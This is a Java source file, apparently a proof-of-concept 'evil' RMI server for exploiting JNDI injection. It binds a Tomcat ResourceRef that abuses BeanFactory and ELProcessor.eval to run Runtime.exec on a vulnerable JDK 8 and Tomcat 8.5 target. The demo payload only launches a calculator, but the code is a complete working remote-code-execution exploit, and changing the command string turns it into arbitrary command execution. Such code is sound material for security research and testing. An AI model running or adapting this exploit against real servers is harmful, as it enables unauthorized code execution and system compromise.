package nth347.servers.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * RMI server for exploiting JNDI injection using local factory class
 * The exploitation technique requires the target application to have tomcat 8 dependencies
 * Tested with target application running on JDK 8u212, having tomcat 8.5.0 dependencies
 */
public class NewEvilRMIServer {
    /**
     * RMI server configuration
     */
    private static String RMI_ADDRESS = "0.0.0.0";
    private static int RMI_PORT = 1099;
    private static String RMI_NAME = "Object";

    public static void main(String[] args) throws Exception {
        System.setProperty("java.rmi.server.hostname", RMI_ADDRESS);
        System.setProperty("java.rmi.server.logCalls", "true");

        Registry registry = LocateRegistry.createRegistry(RMI_PORT);

        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String) null, "", "", true, "org.apache.naming.factory.BeanFactory", (String) null);
        resourceRef.add(new StringRefAddr("forceString", "nth347=eval"));
        resourceRef.add(new StringRefAddr("nth347", "Runtime.getRuntime().exec(\"gnome-calculator\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind(RMI_NAME, referenceWrapper);

        System.out.println("Evil RMI server has started at rmi://" + RMI_ADDRESS + ":" + RMI_PORT + "/" + RMI_NAME);
    }
}
